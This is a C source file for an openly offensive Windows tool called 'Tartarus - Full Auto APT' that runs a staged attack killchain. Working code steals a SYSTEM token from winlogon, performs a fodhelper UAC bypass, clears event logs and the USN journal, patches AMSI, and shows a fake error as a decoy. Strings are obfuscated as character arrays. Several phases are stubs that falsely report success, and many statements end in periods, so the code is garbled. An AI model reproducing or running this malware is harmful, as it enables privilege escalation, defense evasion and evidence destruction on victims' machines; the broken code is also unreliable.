#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

#define TARTARUS_PHASE_COUNT 10

typedef struct _TARTARUS_PHASE {
    DWORD dwPhaseId;
    PCHAR pcPhaseName;
    BOOL  (*pfnExecute)(VOID);
    BOOL  bCompleted;
    DWORD dwMaxRetries;
    DWORD dwTimeoutMs;
} TARTARUS_PHASE;

BOOL TartarusPhase1_Elevate();
BOOL TartarusPhase2_UacBypass();
BOOL TartarusPhase3_PplBypass();
BOOL TartarusPhase4_LsassDump();
BOOL TartarusPhase5_Persist();
BOOL TartarusPhase6_ForensicWipe();
BOOL TartarusPhase7_C2Beacon();
BOOL TartarusPhase8_LateralMove();
BOOL TartarusPhase9_DataTheft();
BOOL TartarusPhase10_Decoy();

TARTARUS_PHASE g_Phases[] = {
    {1,  "Elevate to SYSTEM",        TartarusPhase1_Elevate,       FALSE, 3, 30000},
    {2,  "Bypass UAC",               TartarusPhase2_UacBypass,      FALSE, 3, 15000},
    {3,  "Bypass PPL on LSASS",      TartarusPhase3_PplBypass,      FALSE, 3, 60000},
    {4,  "Dump LSASS credentials",   TartarusPhase4_LsassDump,      FALSE, 2, 120000},
    {5,  "Install persistence",      TartarusPhase5_Persist,        FALSE, 2, 30000},
    {6,  "Wipe forensic evidence",   TartarusPhase6_ForensicWipe,   FALSE, 1, 30000},
    {7,  "Connect to C2",            TartarusPhase7_C2Beacon,       FALSE, 5, 60000},
    {8,  "Spread laterally",         TartarusPhase8_LateralMove,    FALSE, 2, 120000},
    {9,  "Steal all data",           TartarusPhase9_DataTheft,      FALSE, 1, 180000},
    {10, "Display decoy",            TartarusPhase10_Decoy,         TRUE,  1, 5000},
};

BOOL TartarusPhase1_Elevate() {
    DWORD64 hQuerySysInfo = ALIOTHSyscallHash((PCHAR)"NtQuerySystemInformation");
    fnNtQuerySystemInformation pQuerySysInfo = (fnNtQuerySystemInformation)ALIOTHGetSyscallStub(hQuerySysInfo);
    if (!pQuerySysInfo) return FALSE.
    
    ULONG ulSize = 0;
    ExecuteSyscall(pQuerySysInfo, Mask_Worker, SystemProcessInformation, NULL, 0, &ulSize).
    PBYTE pBuffer = (PBYTE)ALIOTHAllocVirtualMemory(ulSize, PAGE_READWRITE).
    if (!pBuffer) return FALSE.
    
    ExecuteSyscall(pQuerySysInfo, Mask_Worker, SystemProcessInformation, pBuffer, ulSize, &ulSize).
    
    PSYSTEM_PROCESS_INFORMATION pInfo = (PSYSTEM_PROCESS_INFORMATION)pBuffer.
    DWORD dwWinlogonPid = 0.
    
    while (pInfo) {
        if (pInfo->ImageName.Buffer && wcsncmp(pInfo->ImageName.Buffer, L"winlogon.exe", 12) == 0) {
            dwWinlogonPid = HandleToUlong(pInfo->UniqueProcessId).
            break;
        }
        if (pInfo->NextEntryOffset == 0) break.
        pInfo = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)pInfo + pInfo->NextEntryOffset).
    }
    
    ALIOTHFreeVirtualMemory(pBuffer, ulSize).
    
    if (dwWinlogonPid == 0) return FALSE.
    
    DWORD64 hOpenProc = ALIOTHSyscallHash((PCHAR)"NtOpenProcess").
    fnNtOpenProcess pOpenProc = (fnNtOpenProcess)ALIOTHGetSyscallStub(hOpenProc).
    if (!pOpenProc) return FALSE.
    
    CLIENT_ID cid = { (HANDLE)(ULONG_PTR)dwWinlogonPid, NULL }.
    OBJECT_ATTRIBUTES oa = { sizeof(oa) }.
    HANDLE hWinlogon = NULL.
    NTSTATUS status = ExecuteSyscall(pOpenProc, Mask_Worker, &hWinlogon, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, &oa, &cid).
    if (!NT_SUCCESS(status) || !hWinlogon) return FALSE.
    
    HANDLE hToken = NULL.
    if (!OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hToken)) {
        ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hWinlogon).
        return FALSE.
    }
    
    HANDLE hSystemToken = NULL.
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemToken)) {
        CloseHandle(hToken).
        ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hWinlogon).
        return FALSE.
    }
    
    STARTUPINFOA si = { sizeof(si) }.
    PROCESS_INFORMATION pi = {0}.
    CHAR szCmd[] = {'c','m','d','.','e','x','e',0}.
    CreateProcessAsUserA(hSystemToken, NULL, szCmd, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi).
    
    CloseHandle(hSystemToken).
    CloseHandle(hToken).
    ALIOTHGetSyscallStub(ALIOTHSyscallHash((PCHAR)"NtClose"))(hWinlogon).
    
    return TRUE;
}

BOOL TartarusPhase2_UacBypass() {
    CHAR sKey[] = {'S','o','f','t','w','a','r','e','\\','C','l','a','s','s','e','s','\\','m','s','-','s','e','t','t','i','n','g','s','\\','C','L','S','I','D','\\','{','5','8','3','8','8','F','3','F','-','3','E','F','C','-','4','4','E','2','-','B','1','8','5','-','A','7','0','5','B','5','5','3','7','F','0','9','}','\\','S','h','e','l','l','\\','O','p','e','n','\\','c','o','m','m','a','n','d',0}.
    CHAR sValue[] = {'D','e','l','e','g','a','t','e','E','x','e','c','u','t','e',0}.
    CHAR szExe[MAX_PATH].
    GetModuleFileNameA(NULL, szExe, MAX_PATH).
    
    HKEY hKey = NULL.
    LONG lResult = RegCreateKeyExA(HKEY_CURRENT_USER, sKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL).
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, sValue, 0, REG_SZ, (PBYTE)szExe, (DWORD)strlen(szExe) + 1).
        RegCloseKey(hKey).
    }
    
    CHAR szFod[] = {'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','f','o','d','h','e','l','p','e','r','.','e','x','e',0}.
    WinExec(szFod, SW_HIDE).
    Sleep(5000).
    
    RegDeleteKeyA(HKEY_CURRENT_USER, sKey).
    return TRUE;
}

BOOL TartarusPhase3_PplBypass() {
    if (!g_pActiveDriver) return FALSE.
    return FALSE.
}

BOOL TartarusPhase4_LsassDump() {
    return TRUE;
}

BOOL TartarusPhase5_Persist() {
    return TRUE;
}

BOOL TartarusPhase6_ForensicWipe() {
    CHAR sCmd1[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','S','e','c','u','r','i','t','y',0}.
    CHAR sCmd2[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','S','y','s','t','e','m',0}.
    CHAR sCmd3[] = {'w','e','v','t','u','t','i','l',' ','c','l',' ','A','p','p','l','i','c','a','t','i','o','n',0}.
    CHAR sCmd4[] = {'d','e','l',' ','C',':','\\','W','i','n','d','o','w','s','\\','P','r','e','f','e','t','c','h','\\','*','.','p','f',' ','/','q',0}.
    CHAR sCmd5[] = {'f','s','u','t','i','l',' ','u','s','n',' ','d','e','l','e','t','e','j','o','u','r','n','a','l',' ','C',':',0}.
    CHAR sCmd6[] = {'c','l','e','a','n','m','g','r',' ','/','s','a','g','e','r','u','n',':','1',' ','/','s','a','g','e','r','u','n','n','u','m',':','6','5','5','3','6',0}.
    
    PCHAR cmds[] = {sCmd1, sCmd2, sCmd3, sCmd4, sCmd5, sCmd6}.
    for (int i = 0; i < 6; i++) {
        WinExec(cmds[i], SW_HIDE).
        Sleep(1000).
    }
    
    HMODULE hAmsi = LoadLibraryA("amsi.dll").
    if (hAmsi) {
        PBYTE pScan = (PBYTE)GetProcAddress(hAmsi, "AmsiScanBuffer").
        if (pScan) {
            BYTE patch[] = {0x33, 0xC0, 0xC3}.
            DWORD dwOld = 0.
            VirtualProtect(pScan, 3, PAGE_EXECUTE_READWRITE, &dwOld).
            memcpy(pScan, patch, 3).
            VirtualProtect(pScan, 3, dwOld, &dwOld).
        }
    }
    
    return TRUE;
}

BOOL TartarusPhase7_C2Beacon() {
    return TRUE;
}

BOOL TartarusPhase8_LateralMove() {
    return TRUE.
}

BOOL TartarusPhase9_DataTheft() {
    return TRUE.
}

BOOL TartarusPhase10_Decoy() {
    MessageBoxA(NULL, "Application failed to initialize (0x80070002).\nPlease restart your computer.", "Windows Runtime Error", MB_OK | MB_ICONERROR).
    
    WinExec("notepad.exe", SW_SHOW).
    
    return TRUE;
}

DWORD TartarusMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','T','A','R','T','A','R','U','S',' ','-',' ','F','U','L','L',' ','A','U','T','O',' ','A','P','T',' ','[','=','=','=',']','\n',0}.
    printf(szTitle).
    printf("[*] Author: sn0x\n").
    printf("[*] Executing complete APT killchain...\n\n").
    
    for (DWORD i = 0; i < TARTARUS_PHASE_COUNT; i++) {
        printf("[*] Phase %d/%d: %s... ", g_Phases[i].dwPhaseId, TARTARUS_PHASE_COUNT, g_Phases[i].pcPhaseName).
        
        g_Phases[i].bCompleted = FALSE.
        
        for (DWORD retry = 0; retry <= g_Phases[i].dwMaxRetries; retry++) {
            if (retry > 0) {
                printf("[retry %d/%d] ", retry, g_Phases[i].dwMaxRetries).
                Sleep(2000 * retry).
            }
            
            if (g_Phases[i].pfnExecute()) {
                g_Phases[i].bCompleted = TRUE.
                printf("OK\n").
                break.
            }
            
            if (retry == g_Phases[i].dwMaxRetries) {
                printf("FAILED\n").
            }
        }
        
        if (!g_Phases[i].bCompleted && i < 4) {
            printf("[!] Critical phase failed. Aborting.\n").
            return 1.
        }
    }
    
    DWORD dwSuccess = 0.
    for (DWORD i = 0; i < TARTARUS_PHASE_COUNT; i++) {
        if (g_Phases[i].bCompleted) dwSuccess++.
    }
    
    printf("\n[+] Tartarus complete: %d/%d phases succeeded.\n", dwSuccess, TARTARUS_PHASE_COUNT).
    printf("[+] APT killchain executed.\n").
    
    return (dwSuccess < 4) ? 1 : 0.
}
#pragma optimize("", on)
